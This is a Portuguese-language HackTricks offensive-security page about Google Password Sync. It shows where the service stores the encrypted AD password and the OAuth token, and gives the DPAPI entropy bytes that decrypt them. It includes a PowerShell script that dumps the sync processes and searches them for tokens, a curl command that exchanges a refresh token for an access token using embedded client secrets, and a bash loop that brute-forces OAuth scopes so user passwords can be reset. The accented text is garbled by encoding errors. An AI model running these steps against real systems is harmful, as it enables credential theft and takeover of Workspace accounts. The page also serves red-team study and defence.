# GPS - Google Password Sync

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Informa√ß√µes B√°sicas

Este √© o bin√°rio e servi√ßo que o Google oferece para **manter sincronizadas as senhas dos usu√°rios entre o AD** e o Workspace. Sempre que um usu√°rio altera sua senha no AD, ela √© definida no Google.

Ele √© instalado em `C:\Program Files\Google\Password Sync`, onde voc√™ pode encontrar o bin√°rio `PasswordSync.exe` para configur√°-lo e `password_sync_service.exe` (o servi√ßo que continuar√° em execu√ß√£o).

### GPS - Configura√ß√£o

Para configurar este bin√°rio (e servi√ßo), √© necess√°rio **dar acesso a um principal Super Admin no Workspace**:

* Login via **OAuth** com o Google e ent√£o ele **armazenar√° um token no registro (criptografado)**
* Dispon√≠vel apenas em Controladores de Dom√≠nio com GUI
* Fornecendo algumas **credenciais de Conta de Servi√ßo do GCP** (arquivo json) com permiss√µes para **gerenciar os usu√°rios do Workspace**
* Ideia muito ruim, pois essas credenciais nunca expiram e podem ser mal utilizadas
* Ideia muito ruim dar acesso a uma SA sobre o workspace, pois a SA pode ser comprometida no GCP e ser√° poss√≠vel pivotar para o Workspace
* O Google exige isso para dom√≠nio controlado sem GUI
* Essas credenciais tamb√©m s√£o armazenadas no registro

Quanto ao AD, √© poss√≠vel indicar para usar o **contexto de aplica√ß√µes atual, an√¥nimo ou algumas credenciais espec√≠ficas**. Se a op√ß√£o de credenciais for selecionada, o **nome de usu√°rio** √© armazenado dentro de um arquivo no **disco** e a **senha** √© **criptografada** e armazenada no **registro**.

### GPS - Extraindo senha e token do disco

{% hint style="success" %}
Note que [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) √© capaz de detectar **GPS**, obter informa√ß√µes sobre a configura√ß√£o e **at√© mesmo descriptografar a senha e o token**.
{% endhint %}

No arquivo **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** √© poss√≠vel encontrar parte da configura√ß√£o, como o **`baseDN`** do AD configurado e o **`username`** cujas credenciais est√£o sendo usadas.

No registro **`HKLM\Software\Google\Google Apps Password Sync`** √© poss√≠vel encontrar o **token de atualiza√ß√£o criptografado** e a **senha criptografada** para o usu√°rio do AD (se houver). Al√©m disso, se em vez de um token, algumas **credenciais de SA** forem usadas, tamb√©m √© poss√≠vel encontr√°-las criptografadas nesse endere√ßo do registro. Os **valores** dentro deste registro s√£o acess√≠veis apenas por **Administradores**.

A **senha** criptografada (se houver) est√° dentro da chave **`ADPassword`** e √© criptografada usando a API **`CryptProtectData`**. Para descriptograf√°-la, voc√™ precisa ser o mesmo usu√°rio que configurou a sincroniza√ß√£o de senhas e usar esta **entropia** ao usar a **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

O token criptografado (se houver) est√° dentro da chave **`AuthToken`** e √© criptografado usando a API **`CryptProtectData`**. Para descriptograf√°-lo, voc√™ precisa ser o mesmo usu√°rio que configurou a sincroniza√ß√£o de senhas e usar esta **entropia** ao usar a **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
Al√©m disso, tamb√©m √© codificado usando base32hex com o dicion√°rio **`0123456789abcdefghijklmnopqrstv`**.

Os valores de entropia foram encontrados usando a ferramenta. Ela foi configurada para monitorar as chamadas para **`CryptUnprotectData`** e **`CryptProtectData`** e ent√£o a ferramenta foi usada para iniciar e monitorar `PasswordSync.exe`, que descriptografar√° a senha configurada e o token de autentica√ß√£o no in√≠cio, e a ferramenta **mostrar√° os valores da entropia usada** em ambos os casos:

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

Note que tamb√©m √© poss√≠vel ver os valores **descriptografados** na entrada ou sa√≠da das chamadas para essas APIs tamb√©m (caso em algum momento o Winpeas pare de funcionar).

Caso a sincroniza√ß√£o de senhas tenha sido **configurada com credenciais de SA**, tamb√©m ser√° armazenada em chaves dentro do registro **`HKLM\Software\Google\Google Apps Password Sync`**.

### GPS - Extraindo tokens da mem√≥ria

Assim como com o GCPW, √© poss√≠vel extrair a mem√≥ria do processo dos processos `PasswordSync.exe` e `password_sync_service.exe` e voc√™ poder√° encontrar tokens de atualiza√ß√£o e de acesso (se j√° tiverem sido gerados).\
Acho que voc√™ tamb√©m poderia encontrar as credenciais configuradas do AD.

<details>

<summary>Dump <code>PasswordSync.exe</code> e os processos <code>password_sync_service.exe</code> e buscar tokens</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - Gerando tokens de acesso a partir de tokens de atualiza√ß√£o

Usando o token de atualiza√ß√£o, √© poss√≠vel gerar tokens de acesso utilizando-o e o ID do cliente e o segredo do cliente especificados no seguinte comando:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Escopos

{% hint style="info" %}
Observe que mesmo tendo um token de atualiza√ß√£o, n√£o √© poss√≠vel solicitar nenhum escopo para o token de acesso, pois voc√™ s√≥ pode solicitar os **escopos suportados pela aplica√ß√£o onde voc√™ est√° gerando o token de acesso**.

Al√©m disso, o token de atualiza√ß√£o n√£o √© v√°lido em todas as aplica√ß√µes.
{% endhint %}

Por padr√£o, o GPS n√£o ter√° acesso como o usu√°rio a todos os poss√≠veis escopos OAuth, ent√£o usando o seguinte script podemos encontrar os escopos que podem ser usados com o `refresh_token` para gerar um `access_token`:

<details>

<summary>Script Bash para for√ßa bruta de escopos</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

E este √© o resultado que obtive no momento da escrita:
```
https://www.googleapis.com/auth/admin.directory.user
```
Qual √© o mesmo que voc√™ obt√©m se n√£o indicar nenhum escopo.

{% hint style="danger" %}
Com este escopo voc√™ poderia **modificar a senha de um usu√°rio existente para escalar privil√©gios**.
{% endhint %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
